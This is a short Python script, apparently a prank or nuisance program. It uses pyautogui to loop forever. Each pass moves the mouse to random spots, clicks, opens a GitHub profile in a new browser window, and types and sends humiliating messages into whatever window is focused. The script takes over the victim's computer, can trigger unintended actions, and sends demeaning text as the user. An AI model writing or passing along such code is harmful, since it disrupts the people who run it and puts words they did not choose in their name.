import pyautogui, random, os, threading, webbrowser

width, height = pyautogui.size()

def openwebsite():
    url = "https://github.com/Owersite"
    webbrowser.open(url, new=2)

def movecursor():
    randomX = random.randint(0, width)
    randomY = random.randint(0, height)
    pyautogui.moveTo(randomX, randomY)

def clicking():
    pyautogui.doubleClick()
    pyautogui.click(button="right")

def spammsg():
    pyautogui.write("Im gay ...")
    pyautogui.write("Owersite is my daddy ...")
    pyautogui.press("enter")

while True:
    thread1 = threading.Thread(target=movecursor)
    thread1.start()
    thread2 = threading.Thread(target=openwebsite)
    thread2.start()
    spammsg()
    clicking()
